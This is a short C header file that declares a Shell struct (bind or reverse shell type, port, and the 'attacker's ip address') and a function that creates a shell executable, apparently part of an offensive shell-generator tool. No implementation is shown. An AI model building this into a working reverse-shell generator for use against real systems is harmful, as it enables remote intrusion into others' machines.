#ifndef SHELL_HEADER
#define SHELL_HEADER
// Holds basic members pertaining to the shell we are defining
struct Shell {
    // 0=bind shell, 1=reverse shell
    int type;

    // port to connect on
    int port;

    // attacker's ip address in string format
    char * ip; 
};

void createShellExecutable(struct Shell shell);



#endif